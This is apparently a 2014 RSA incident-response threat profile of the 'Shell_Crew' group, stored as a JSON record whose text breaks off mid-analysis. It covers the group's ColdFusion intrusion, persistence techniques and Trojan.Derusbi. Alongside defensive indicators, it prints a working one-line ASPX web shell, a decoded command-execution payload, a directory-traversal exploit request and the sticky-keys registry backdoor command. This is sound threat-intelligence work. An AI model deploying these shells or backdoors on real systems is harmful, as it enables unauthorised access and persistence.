{
    "id": "fe8e798e-1ed2-415d-9e00-ac3d9e2929c8",
    "created_at": "2022-10-25T16:48:24.758188Z",
    "updated_at": "2025-03-27T02:16:42.976195Z",
    "deleted_at": null,
    "sha1_hash": "ec6771a81e830f50c2d54b26dc0f6a642439ee09",
    "title": "Emerging Threat Profile Shell_Crew",
    "authors": "RSA",
    "file_creation_date": "2014-01-27T22:27:02Z",
    "file_modification_date": "2014-01-28T12:34:52Z",
    "file_size": 3608125,
    "plain_text": "RSA Incident Response incident\n\n\n# RSA Incident Response: Emerging Threat Profile\n Shell_Crew\n\n## January 2014\n\n\n-----\n\n### Table of Contents\n\n##### Table of Contents ....................................................................................................................................................2\n\n### Report Overview ............................................................................................................................... 5\n\n Intrusion Vector ................................................................................................................................. 6\n\n##### Intrusion Overview ...........................................................................................................................................6\n\n Intrusion Details ...............................................................................................................................................7\n\n### Entrenchment Techniques ............................................................................................................... 9\n\n##### Installation of Web shells ....................................................................................................................................... 9\n\n Registering DLLs with Internet Information Services (IIS) .................................................................................... 10\n\n Modifying the ‘System.Web.dll’ file ..................................................................................................................... 11\n\n Trojan.Derusbi ...................................................................................................................................................... 13\n\n ‘Sethc’ RDP backdoor ............................................................................................................................................ 13\n\n### Malicious Files and Secondary Tools ............................................................................................ 15\n\n##### Malicious Files and Secondary Tools Hash List .................................................................................................. 15\n\n Malicious Files – Technical Analysis ................................................................................................................. 17\n\n Trojan.Derusbi ...................................................................................................................................................... 17\n\n Trojan.Derusbi Server Variant .............................................................................................................................. 24\n\n Secondary Tools – Technical Analysis ............................................................................................................... 28\n\n Notepad.exe ......................................................................................................................................................... 28\n\n Credential Logger .................................................................................................................................................. 31\n\n### Detection, Mitigation, and Remediation .................................................................................... 33\n\n##### General Forensic Footprints ................................................................................................................................. 33\n\n Security Analytics Integration ............................................................................................................................... 33\n\n ECAT Integration ................................................................................................................................................... 34\n\n Yara Signatures ..................................................................................................................................................... 35\n\n Hash Set, IPs, Domains ......................................................................................................................................... 35\n\n### Conclusion ........................................................................................................................................ 36\n\n Appendix 1 – Trojan.Derusbi Variants ......................................................................................... 37\n\n Appendix 2 – Trojan.Notepad Illustration .................................................................................. 41\n\n Digital Appendix - Details .............................................................................................................. 42\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 3\n\n### Table of Figures\n\nFigure 1: Anatomy of Web Application Penetration ........................................................................................................................... 6\n\nFigure 2: Web server log entry ........................................................................................................................................................... 7\n\nFigure 3: Example content of a password.properties file ................................................................................................................... 7\n\nFigure 4: ColdFusion task that downloads Web shell ......................................................................................................................... 7\n\nFigure 5: Log entry showing the use of \"x.cfm\" by IP 125.141.233.19 ............................................................................................... 8\n\nFigure 6: Command executed via Web shell ...................................................................................................................................... 8\n\nFigure 7: Example of a simple Shell_Crew Web shell ......................................................................................................................... 9\n\nFigure 8: ColdFusion Web shell interface example ........................................................................................................................... 10\n\nFigure 9: Command used to register a DLL with IIS .......................................................................................................................... 10\n\nFigure 10: POST request on IIS registered DLL .................................................................................................................................. 11\n\nFigure 11: POST request to a non-existent Web page ...................................................................................................................... 11\n\nFigure 12: Modified content of PagehandlerFactory.cs ................................................................................................................... 11\n\nFigure 13: Content of default_aspx.cs .............................................................................................................................................. 12\n\nFigure 14: POST request on nonexistent webpage ........................................................................................................................... 12\n\nFigure 15: Decoded base64 text from the POST request ................................................................................................................. 12\n\nFigure 16: The script was further decoded to reveal the contents .................................................................................................. 13\n\nFigure 17: Reply from infected Web server ...................................................................................................................................... 13\n\nFigure 18: Registry modification to invoke sethc.exe debugging ..................................................................................................... 14\n\nFigure 19: RDP backdoor example .................................................................................................................................................... 14\n\nFigure 20: Details of the file 'msressvkx.ttf' - a Trojan.Derusbi variant ............................................................................................ 17\n\nFigure 21: Trojan.Derusbi Configuration Data Decoding Function ................................................................................................... 18\n\nFigure 22: Decoded Trojan.Derusbi configuration data ................................................................................................................... 19\n\nFigure 23: Trojan.Derusbi Configuration Data Encoding Function ................................................................................................... 20\n\nFigure 24: XOR key that is used to decode the driver file ................................................................................................................. 21\n\nFigure 25: Trojan.Derusbi Driver Decoding Function........................................................................................................................ 22\n\nFigure 26: POST request initiated by Trojan.Derusbi ........................................................................................................................ 22\n\nFigure 27: Binary data transmitted by Trojan.Derusbi ..................................................................................................................... 23\n\nFigure 28: The Binary data contains a set of three DWORDs ........................................................................................................... 23\n\nFigure 29: GET request transmitted by the Trojan ........................................................................................................................... 23\n\nFigure 30: Characteristics of the file 2.dll - a Trojan.Derusbi variant ............................................................................................... 24\n\nFigure 31: Derusbi server variant - check OS version logic ............................................................................................................... 25\n\nFigure 32: Registry key identifying the service name and Trojan file ............................................................................................... 25\n\nFigure 33: Driver logic that looks for handshake .............................................................................................................................. 26\n\nFigure 34: Trojan.Derusbi server variant handshake structure ........................................................................................................ 26\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 4\n\nFigure 35: Trojan.Derusbi server variant handshake sample data ................................................................................................... 26\n\nFigure 36: Trojan.Derusbi server variant - authentication ............................................................................................................... 27\n\nFigure 37: Trojan.Derusbi server variant – protocol components .................................................................................................... 27\n\nFigure 38: Common usage of notepad.exe ....................................................................................................................................... 28\n\nFigure 39: File details of notepad.exe ............................................................................................................................................... 28\n\nFigure 40: Resource of notepad.exe ................................................................................................................................................. 29\n\nFigure 41: Notepad.exe - built in C2 data structure ......................................................................................................................... 29\n\nFigure 42: C2 obfuscation in notepad.exe ........................................................................................................................................ 29\n\nFigure 43: Details of the file xmlobj.dll ............................................................................................................................................. 31\n\nFigure 44: Sample of harvested credentials ..................................................................................................................................... 32\n\nFigure 45: ECAT detects a suspicious outbound connection ............................................................................................................ 34\n\nFigure 46: Alert sent by ECAT ........................................................................................................................................................... 34\n\nFigure 47: MFT File Viewer in ECAT .................................................................................................................................................. 35\n\nFigure 48: Malware sample testing .................................................................................................................................................. 35\n\nFigure 49: Trojan.Derusbi Variants Mutex Overlap .......................................................................................................................... 37\n\nFigure 50: Trojan.Derusbi variants XOR key overlap ........................................................................................................................ 38\n\nFigure 51: Trojan.Derusbi variants XOR key overlap ........................................................................................................................ 39\n\nFigure 52: Trojan.Derusbi variants XOR key overlap ........................................................................................................................ 40\n\nFigure 53: Relationships between Trojan.Notepad samples ............................................................................................................ 41\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 5\n\n### Report Overview\n\nThe purpose of this report is to share actionable threat intelligence associated with an advanced adversary the RSA IR Team\nis tracking. Threat intelligence related to advanced adversaries enables security practitioners to mitigate threat impact\nbefore the adversary becomes entrenched in an organization’s infrastructure. If a breach has already occurred, threat\nintelligence bolsters incident investigation activities and expedites remediation; ultimately reducing exposure times and\nminimizing potential data loss.\n\nDuring recent engagements, the RSA IR Team has responded to multiple incidents involving a common adversary targeting\neach client’s infrastructure and assets. The RSA IR Team is referring to this threat group internally as “Shell_Crew”;\nhowever, they are also referred to as Deep Panda, WebMasters, KungFu Kittens, SportsFans, and PinkPanther amongst the\nsecurity community.\n\nShell_Crew is generally known to utilize the following tactics, techniques, and procedures (TTPs);\n\n  - Prevalent use of Web shells to maintain low level persistence in spite of determined remediation efforts;\n\n  - Occasional use of Web application framework exploits to achieve initial entry as opposed to traditional\nspearfishing attempts;\n\n  - Lateral movement using compromised credentials with RDP, psexec, or network connections in conjunction with\nscheduling jobs with the “at” command.\n\n  - Abuse of Code Signing infrastructure to validly sign custom backdoor malware;\n\n  - Exploiting systems using different SETHC.exe methods accessible via Remote Desktop Protocol (RDP);\n\n  - Long history of IP/DNS telemetry allowing for historical research and link analysis;\n\n  - Placement of malicious proxy tools introduced into the environment on Windows server based proxies to bypass\nproxy logging;\n\n  - Extensive use of time/date stomping of malicious files to hinder forensic analysis; and\n\n  - Malware leveraging compromised credentials to bypass authentication NTLM proxies (proxy aware).\n\nThis emerging threat profile covers a sampling of observed indicators that have been derived by analyzing a variety of tools\nand malicious code collected during recent engagements involving Shell_Crew. Included are details about an observed\nintrusion vector, entrenchment techniques, unique malicious files, and tools that are used by this adversary. Additionally,\nthe RSA IR Team has provided content in the form of a digital appendix that can be integrated into Security Analytics, the\nEnterprise Compromise Assessment Tool (ECAT), or other security tools for rapid detection and visibility of indicators\nassociated with Shell_Crew.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 6\n\n### Intrusion Vector\n\n Intrusion Overview\n\nShell_Crew has an affinity for exploiting web application vulnerabilities to gain access to the victim’s network and\ninformation systems. In this section, we’ve provided details pertaining to an instance where Shell_Crew breached a victim\nnetwork through the exploitation of an Adobe ColdFusion directory traversal vulnerability (CVE-2010-2861). This exploit\nallowed Shell_Crew to read the ‘password.properties’ file containing the password hash of the ColdFusion ‘administrator’\naccount. After obtaining this password hash, Shell_Crew was able to recover the password associated with the\nadministrative account, likely by using pre-computed rainbow tables. Using the acquired administrator account credentials,\nShell_Crew created a ColdFusion scheduled task to download a malicious Web shell to the ColdFusion server. They then\nutilized this Web shell to upload additional Web shells, hash dumping tools, and other Trojans onto the system, as well as\ncreated a backdoor into the system for reentry. Using the tools uploaded to the server, Shell_Crew dumped password\nhashes from the compromised system, performed network reconnaissance, and moved laterally to systems in the internal\nnetwork using the compromised credentials with the pass-the-hash technique.\n\nFigure 1 below illustrates the high level anatomy of this particular Shell_Crew attack.\n\n**Figure 1: Anatomy of Shell_Crew Web Application Penetration**\n\n\n-----\n\nRSA Incident Response Page 7\n\n### Intrusion Details\n\nOn 18[th] June, 2013 an attacker using IP address 184.71.210.4 connected to the ColdFusion Web server and exploited the\nAdobe ColdFusion directory traversal vulnerability, CVE-2010-2861, to recover the contents of the password.properties file.\nFigure 2 below depicts a log entry from the Web server that illustrates the initial point of exploitation. The data highlighted\nin blue shows the directory traversal used to access the password.properties file. In addition, the data highlighted with red\n(zh-cn) in the User-Agent indicates the language tag on the attacker’s system.\n\n\n2013-06-18 05:17:30 W3SVC1 10.193.23.45 GET /CFIDE/administrator/enter.cfm\n**locale=..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\ password.properties%00en 80 – 184.71.210.4**\nOpera/9.80+(Windows+NT+6.1;+U;+Edition+IBIS;+zh-cn)+Presto/ 2.10.229+Version/11.61\n\n\n**Figure 2: Web server log entry**\n\nThe password.properties file contained the hash value of the ColdFusion administrator account, which can be seen in Figure\n3 below:\n\n**Figure 3: Example content of a password.properties file**\n\nThrough review of log files found on the Web server, the RSA IR team identified that within 10 minutes of retrieving the\npassword.properties file, Shell_Crew logged in to the ColdFusion management page using the recovered administrator\naccount credentials. This indicates that Shell_Crew quickly enumerated the password from the hash value found in the\npassword.properties file. Once logged in with the administrator account, Shell_Crew scheduled a job called “test” to\ndownload a file containing a ColdFusion Web shell from “http://mpe.ie/1234.zip” and save it to the Web server’s local\ndirectory D:\\mywebsite\\x.cfm.[1] The log entry from the Web server that shows scheduling of this job is visible in Figure 4.\n\n**Figure 4: ColdFusion task that downloads Web shell**\n\nThe file downloaded from the remote system to the ColdFusion server, 1234.zip, is a ColdFusion Web shell called “cfm\n**backdoor by ufo”. Once the Web shell was downloaded to the Web server by the ColdFusion job, the adversary was able to**\nutilize the functionality of the Web shell to execute commands on the local system, illustrated in Figure 5 and Figure 6.\n\n1 The name of the website has been changed to protect the privacy of the victim.\n\n\n-----\n\nRSA Incident Response Page 8\n\n```\n2013-06-18 05:29:13 W3SVC1 10.193.23.45 POST /x.cfm - 80 - 125.141.233.19\nMozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1)\n\n```\n\n**Figure 5: Log entry showing the use of \"x.cfm\" by IP 125.141.233.19**\n\n**Figure 6: Command executed via Web shell**\n\nOnce Shell_Crew has a foothold into the victim’s network, they move to other systems within the environment to ensure\nmultiple points for re-entry. Some of the techniques used by Shell_Crew to further insert themselves into a victim’s\nenvironment are outlined in the next section of this report; Entrenchment Techniques\n\n\n-----\n\nRSA Incident Response Page 9\n\n### Entrenchment Techniques\n\nShell_Crew uses a variety of techniques to entrench themselves in a victim’s network. For purposes of this report, the term\nentrenchment is used to describe a technique used by the adversary that allows them to maintain unauthorized access into\nan enterprise despite attempted remediation efforts by the victim. In addition to traditional Trojans that beacon out to a\ndestination IP address, this adversary has also been observed utilizing the following entrenchment techniques;\n\n  - Installation of Web shells;\n\n  - Registering DLLs with Internet Information Services (IIS);\n\n  - Modifying the ‘System.Web.dll’ file;\n\n  - Trojan.Derusbi; and\n\n  - Utilizing the RDP backdoor ‘sethc.exe’.\n\nThis section of the report discusses each of these entrenchment techniques in further detail.\n\n##### 1. Installation of Web shells\n\nWeb shells are files containing malicious code written in various Web scripting languages, such as JSP, CFM, ASP, ASPX, or\nPHP, that when hosted on a publicly accessible Web site allow an adversary such as Shell_Crew to gain remote access and\nperform various unauthorized activities on a compromised system and network. A Web shell can be a stand-alone file that\nonly contains Web shell code, or can be an insertion of malicious code directly into an existing legitimate Web site page,\nthus allowing the adversary to blend with normal traffic and files on the Web server.\n\nUsing Web shells has several advantages over traditional Trojans including:\n\n  - Low detection rates from Anti-Virus programs due to the variety and customization of code;\n\n  - The inability to block or monitor an IP since connectivity can be initiated from any source address; and\n\n  - There is no beaconing activity from a Web shell.\n\nThe complexity of the Web shells used by Shell_Crew varies dramatically. Figure 7 shows the contents of a simple Web shell\nidentified during a recent engagement where Shell_Crew had uploaded the Web shell as a standalone file. This one line of\ncode allowed Shell_Crew to execute shell commands remotely on the Web server. The red text depicted within the\nexample has been changed as the password value used by Shell_Crew made reference to the name of the victim company.\n\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"password\"],\"unsafe\");%>\n\n```\n\n**Figure 7: Example of a simple Shell_Crew Web shell**\n\nShell_Crew also uses more complex Web shells that contain hundreds of lines of code and offer advanced functionality\nequal to many capable Trojans. This functionality can include capabilities such as:\n\n  - File system traversal;\n\n  - File/folder upload, download, and modify;\n\n  - Command execution;\n\n  - Time stomp files/folder;\n\n  - Database connectivity; and\n\n  - Communication obfuscation (typically Base64 or ASCII hex encoding).\n\nFigure 8 below is a screenshot of the ColdFusion Web shell used by Shell_Crew as referenced in the Intrusion Vector section\nof this report.  This Web shell contains robust capabilities such as command execution, directory traversal, file uploads, and\nthe ability to gather basic system information.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 10\n```\n                                                                                             POST /x.cfm HTTP/1.1\n                                                                                             Host: mywebsite.com\n                                                                                             Connection: keep-alive\n                                                                                             Referer: http://mywebsite.com/x.cfm\n                                                                                             Content-Length: 47\n                                                                                             Cache-Control: max-age=0\n                                                                                             Origin: http://mywebsite.com\n                                                                                             User-Agent: Mozilla/5 0 (Windows NT 6 1;\n\n```\n**Figure 8: ColdFusion Web shell interface example**\n\n##### 2. Registering DLLs with Internet Information Services (IIS)\n\nAnother entrenchment technique used by Shell_Crew on compromised systems is to register a DLL with IIS. Figure 9 below\nis an example where a malicious DLL was registered with the IIS Web server using the command line. The ScriptMaps.vbs\nfile is a built in function of IIS for running VBScripts, and is fully documented in MSDN[2].\n\n```\ncscript D:\\mywebsite\\ScriptMaps.vbs -a \".jna,C:\\windows\\system32\\inetsrv\\\nmyDLLname.dll,1,GET,HEAD,POST,TRACE\"\n\n```\n```\n       POST /x.cfm HTTP/1.1\n       Host: mywebsite.com\n       Connection: keep-alive\n       Referer: http://mywebsite.com/x.cfm\n       Content-Length: 47\n       Cache-Control: max-age=0\n       Origin: http://mywebsite.com\n       User-Agent: Mozilla/5 0 (Windows NT 6 1; WOW64)\n\n```\n\n**Figure 9: Command used to register a DLL with IIS**\n\nThis command line modification will ensure that any incoming request (whether it is a GET, POST, HEAD, or TRACE) with a\n.jna extension, will be handled by the now registered malicious DLL, in the example in Figure 9, myDLLname.dll. This allows\nShell_Crew to make different requests; both in the request type, such as GET or POST, and the file being requested, making\ndetection more difficult. This method of using various request parameters can be coupled with erratic IP Addresses further\ndecreasing the likelihood that the activity will be detected by conventional means. Figure 10 depicts a sample request to a\ncompromised Web server.\n\n2 http://msdn.microsoft.com/en-us/library/ms526052%28v=vs.90%29.aspx\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 11\n\n**Figure 10: POST request on IIS registered DLL**\n\n##### 3. Modifying the ‘System.Web.dll’ file\n\nThis entrenchment technique was discovered after Shell_Crew made POST requests to nonexistent Web pages on a Web\nserver running IIS. The POST requests always started with a marker string that looked like a hash value. Requests to the\nsame non-existent Web page without the marker would result in a code 404, i.e. page not found. Figure 11 shows an\nexample of a POST request sent by Shell_Crew to a non-existent webpage.\n\n```\n4B39DD871AD56E6BFEC750C33138B985=Response.Write(\"-->|\");var\nerr:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System\n.Convert.FromBase64String(\"……\n\n```\n\n**Figure 11: POST request to a non-existent Web page**\n\nThe typically benign .NET Microsoft file ‘System.Web.dll’ is an assembly that contains several namespaces. When\ndecompiled with a .NET Decompiler (such as .NET Reflector) the result will be hundreds of C# scripts. Shell_Crew replaced\nthe existing System.Web.dll with a version which contained changes to two C# scripts:\n\n    - Disassembler\\System.Web\\System\\Web\\UI\\PageHandlerFactory.cs\n\n    - Disassembler\\System.Web\\System\\Web\\Util\\default_aspx.cs\n\nThe first script file PagehandlerFactory.cs contains adversary added code that looks for this marker in the content of the\nrequest: 4B39DD871AD56E6BFEC750C33138B985.  When the marker is present, it lets default_aspx.cs handle the request\nthat follows the marker. Figure 12 highlights the modifications made to the PagehandlerFactory.cs file.\n\n**Figure 12: Modified content of PagehandlerFactory.cs**\n\n\n-----\n\nRSA Incident Response Page 12\n\nWhen called by the script PagehandlerFactory.cs, the file default_aspx.cs, which also contains code added by the adversary,\nperforms the eval function on the request sent in the original POST request to the non-existent Web page.\n\n**Figure 13: Content of default_aspx.cs**\n\nIn this instance, the POST request contained data that was Base64 encoded to obfuscate the malicious nature of the\nrequest, as shown in Figure 14.\n\n**Figure 14: POST request on nonexistent webpage**\n\nBelow in Figure 15 is the decoded blue text from the POST request in Figure 14.\n\nvar c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.\nFromBase64String(Request.Item[\"z1\"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.\nIO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\n\"/c \"+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"z2\"]));e.Start();\nout=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());\n\n**Figure 15: Decoded base64 text from the POST request**\n\nAdditionally, the actual command within the above POST request is also Base64 encoded. Below in Figure 16, the encoded\ntext from the above POST request decoded.\n\n\nvar c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.\nFromBase64String(Request.Item[\"z1\"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.\nIO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\n\"/c \"+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"z2\"]));e.Start();\nout=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());\n\n\n-----\n\nRSA Incident Response Page 13\n```\n  z1=Y21k&z2=Y2QgL2QgIkQ6XG15d2Vic2VydmVyXCImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd\n        z1=cmd&z2= cd /d \"D:\\mywebserver\\\"&whoami&echo [S]&cd&echo [E]\n\n```\n**Figure 16: The script was further decoded to reveal the contents**\n\nThe reply from the server to these POST requests is not obfuscated and could be found in Web server log files as shown in\nFigure 17.\n\n**Figure 17: Reply from infected Web server**\n\n##### 4. Trojan.Derusbi\n\nIn addition to deploying traditional versions of what Symantec calls Trojan.Derusbi (i.e. samples that beacon to a hardcoded domain/IP address), this adversary deployed a custom version of this Trojan on perimeter servers. Trojan.Derusbi\ntypically consists of a DLL and driver file. The driver of the customized Trojan.Derusbi variant in this example monitors all\nTCP ports that are utilized by various Windows services. When a connection is established on any TCP port, the driver\nchecks to see if it received a handshake packet. The handshake packet contains a simple structure, which allows the Trojan\nto function even on busy Web servers.\n\nWhen a handshake packet is received, the DLL also replies back with a handshake packet. In addition to the handshake, this\nvariant of Trojan.Derusbi also has an authentication step where the client must send the right password to the Trojan. The\ncommunication protocol consist of a 24 byte header, and the data is compressed and obfuscated with 4-byte XOR key,\nwhich is dynamically generated for each transmission, and which is included in the 24-byte header. This Trojan offers both\ntypical and advanced Trojan functionalities, such as: file traversal, process start/terminate, upload/download, time\nstomping, and self-updating.\n\nAnalysis of customized Trojan.Derusbi variants utilized by Shell_Crew can be found in the below Malicious Files and\nSecondary Tools section.\n\n##### 5. ‘Sethc’ RDP backdoor – ‘Sticky-Keys backdoor’\n\nThis well-known technique that is commonly referred to as the sticky-keys backdoor is used when systems on the targeted\norganization have Microsoft Remote Desktop Protocol (RDP) enabled. While this technique is not exclusive to Shell_Crew,\n\n```\n z1=Y21k&z2=Y2QgL2QgIkQ6XG15d2Vic2VydmVyXCImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd\n\n```\n\n-----\n\nRSA Incident Response Page 14\n\nthe RSA IR Team has observed this group utilize the technique in several different environments. There are two common\nways that a system can be exploited using this technique.\n\n1. File sethc.exe is replaced with another file (typically cmd.exe or explorer.exe) in one or both of these two locations:\n```\n  C:\\Windows\\system32\\sethc.exe\n  C:\\Windows\\system32\\dllcache\\sethc.exe\n\n```\nThe result of making this change on a system which has RDP enabled, is that once presented with the RDP Windows logon\nscreen, simply pressing the SHIFT key 5 times will launch either a command shell (cmd.exe), a windows explorer window\n(explorer.exe), or whatever program was copied to replace the sethc.exe application executable.\n\n2. The second technique makes a registry modification to launch a debugger anytime sethc.exe is executed and registers\ncmd.exe (or any other file) as the debugger. So, anytime sethc.exe is invoked (explained in the next paragraph),\nWindows automatically executes its “debugger”, i.e.cmd.exe. The registry modification is shown in Figure 18.\n\n```\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution\nOptions\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"\n\n```\n\n**Figure 18: Registry modification to invoke sethc.exe debugging**\n\nThe result of making this change on a system which has RDP enabled, is that once presented with the RDP Windows logon\nscreen, simply pressing the SHIFT key 5 times will launch either a command shell, cmd.exe as shown in Figure 18, or\nwhichever program has been set as the debug program in the registry. The process runs under the context of the SYSTEM\naccount. Since this technique does not involve any malicious files, there is limited capability for AV vendors to detect this\nbackdoor.\n\nFigure 19 shows an example of a system that has the Stick Key set to present a command shell when invoked.\n\n**Figure 19: RDP backdoor example**\n\n\n-----\n\nRSA Incident Response Page 15\n\n### Malicious Files and Secondary Tools\n\nShell_Crew uses a variety of malicious Trojans and tools to entrench themselves, move laterally, and persist within a\ntargeted environment. This portion of the report will detail the malicious files and secondary tools identified during recent\nengagements involving Shell_Crew. The sections are broken up as follows:\n\n    - Malicious Files and Secondary Tools Hash List;\n\n    - Malicious Files – Technical Analysis; and\n\n    - Secondary Tools – Technical Analysis\n\n### Malicious Files and Secondary Tools Hash List\n\nThe following list of Trojans and tools have been used by Shell_Crew during various investigations conducted by the RSA IR\nteam. The Web shells that are often used by Shell_Crew can be easily modified for specific missions or victims, and\nsubsequently, hash values are not listed for those files. Additionally, many Web shell samples identified reference specific\nvictim names, which once redacted, would change the hash value of the file.\n\nMD5 Hash Description\n\n**90eddad3327a63fdea924fb802bc7dc5** Credential logger\n\n**77932654f5087ac5e157dfb6ff9b7524** Derusbi dropper\n\n**cc09af194acf2039ad9f6074d89157ca** Derusbi server variant\n\n**a395eed1d0f8a7a79bdebbfd6c673cc1** Mimikatz\n\n**469d4825c5acacb62d1c109085790849** Mimikatz DLL\n\n**eb698247808b8e35ed5a9d5fefd7a3ae** Password hash dumper\n\n**62567951f942f6015138449520e67aeb** Trojan.Notepad\n\n**2dce7fc3f52a692d8a84a0c182519133** Trojan.Notepad\n\n**7a6154e1c07aded990bd07f604af4acf** Trojan.Notepad\n\n**ef0493b075a592abc29b8e9ec43aca07** Trojan.Notepad\n\n**985abc913a294c096718892332631ec9** Trojan.Notepad\n\n**42ecdce7d7dab7c3088e332ff4f64875** Trojan.Notepad\n\n**106e63dbda3a76beeb53a8bbd8f98927** Trojan.Notepad\n\n**42d98ddb0a5b870e8bb828fb2ef22b3f** Trojan.Notepad\n\n**fcb89c7ab7fa08f322148d3b67b34c49** Windows Cred Editor\n\n**128c17340cb5add26bf60dfe2af37700** Trojan.Derusbi\n\n**1ae0c39cb9684652c017161f8a5aca78** Trojan.Derusbi\n\n**2f05c07e3f925265cd45ef1d0243a511** Trojan.Derusbi\n\n**312888a0742815cccc53dc37abf1a958** Trojan.Derusbi\n\n**3804d23ddb141c977b98c2885953444f** Trojan.Derusbi\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 16\n\n**3a27de4fb6e2c524e883c40a43da554e** Trojan.Derusbi\n\n**3c973c1ad37dae0443a078dba685c0ea** Trojan.Derusbi\n\n**3dec6df39910045791ee697f461baaba** Trojan.Derusbi\n\n**449521ce87ed0111dcb0d4beff85064d** Trojan.Derusbi\n\n**59cb505d1636119f2881caa14bf42326** Trojan.Derusbi\n\n**6802c21d3d0d80084bf93413dc0c23a7** Trojan.Derusbi\n\n**6811b8667e08ffa5fcd8a69ca9c72161** Trojan.Derusbi\n\n**6d620d5a903f0d714c30565a9bfdce8f** Trojan.Derusbi\n\n**6ec15a34f058176be4e4685eda9a5cfc** Trojan.Derusbi\n\n**72662c61ae8ef7566a945f648e9d4dd8** Trojan.Derusbi\n\n**75b3ccd4d3bfb56b55a46fba9463d282** Trojan.Derusbi\n\n**76767ef2d2bb25eba45203f0d2e8335b** Trojan.Derusbi\n\n**837b6b1601e0fa99f28657dee244223b** Trojan.Derusbi\n\n**87f93dcfa2c329081ddbd175ea6d946b** Trojan.Derusbi\n\n**8c0cf5bc1f75d71879b48a286f6befcf** Trojan.Derusbi\n\n**9318d336f8d8018fd97357c26a2dfb20** Trojan.Derusbi\n\n**a1fb51343f3724e8b683a93f2d42127b** Trojan.Derusbi\n\n**bc32ecb75624a7bec7a901e10c195307** Trojan.Derusbi\n\n**c353bac6ebace04b376adf1f3115e087** Trojan.Derusbi\n\n**d3ad90010c701e731835142fabb6bfcc** Trojan.Derusbi\n\n**de7500fc1065a081180841f32f06a537** Trojan.Derusbi\n\n**eeb636886ecc9ff3623d10f1efcf3c09** Trojan.Derusbi\n\n**f942f98cff86f8fcde7eb0c2f465be7a** Trojan.Derusbi\n\n**Table 1: List of Malicious Files**\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 17\n\n### Malicious Files – Technical Analysis\n\nShell_Crew uses a variety of malicious Trojans and tools to entrench themselves in a customer environment, however they\nconsistently employ Trojans such as Trojan.Derusbi and variations of this Trojan family. This portion of the report will detail\nthe technical analysis of two of the custom variations of Trojan.Derusbi used by Shell_Crew.\n\n##### 1. Trojan.Derusbi\n\nThe RSA IR Team has observed Shell_Crew deploy different variants of the Trojan.Derusbi family. This Trojan family\nprovides attackers a backdoor into the enterprise, as well as functionality to locate and decrypt passwords stored on the\nsystem by web browsers like Firefox and Internet Explorer, gather system and network information, and upload or\ndownload files. Details of a sample found during a recent engagement involving Shell_Crew have been provided in Figure\n20.\n\n```\nFile Name: msressvkx.ttf\nFile Size: 141928 bytes\nMD5:    c0d4c5b669cc5b51862db37e972d31ec\nSHA1:    0beaa9038e9884bdda6b08c3737e7ee14894a6cf\nPE Time:  0x4EAD4675 [Sun Oct 30 12:43:33 2011 UTC]\nPEID Sig:  Microsoft Visual C++ v6.0 DLL\nPEID Sig:  Microsoft Visual C++ v7.0 DLL\nSections (5):\n Name   Entropy MD5\n .text   6.4   ac994b0a4a872010d47652211eb789d8\n .rdata  5.33   ca075b2352348728dc38d309d1a52499\n .data   6.69   cdd5648583ab062550db0f1039700e28\n .rsrc   2.89   463fc58dc7c103c564540cd1191f6c06\n .reloc  6.03   7430b0b237db5acf3c691df23c915847\n\n```\n\n**Figure 20: Details of the file 'msressvkx.ttf' - a Trojan.Derusbi variant**\n\nIt should be noted that the original sample contained a hard coded URL that made reference to a company name; because\nof this, the hard coded IP Address was replaced and the MD5 and SHA1 hash values provided above are for the sanitized\nfile. This Trojan has an embedded and encoded driver file that is written to the infected system and then launched. This\ndriver will hook the IP, TCP, UDP, and RawIP driver files that normally run on a system.\n\nWhen this particular Trojan.Derusbi variant is initially executed it checks to see if the registry key\n“HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc\\Security” is present in the registry. This registry key location is where\nthe Trojan will store its encoded configuration data. If the key is not present on the system, the sample will first decode the\nconfiguration data that is embedded in the Trojan found at position 0x1EC88.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 18\n\nFigure 21 below shows the function responsible for decoding this embedded data with the XOR key ‘0x 76 2D F2 41’. Once\nthe configuration data has been initially decoded, it will be placed into memory and the Trojan will resolve the current\nmachine name and append 4 characters of pseudorandom data separated by a dash “-“. This null terminated string will\nthen overwrite the first portion of data in the decoded configuration file.\n\n**Figure 21: Trojan.Derusbi Configuration Data Decoding Function**\n\n\n-----\n\nRSA Incident Response Page 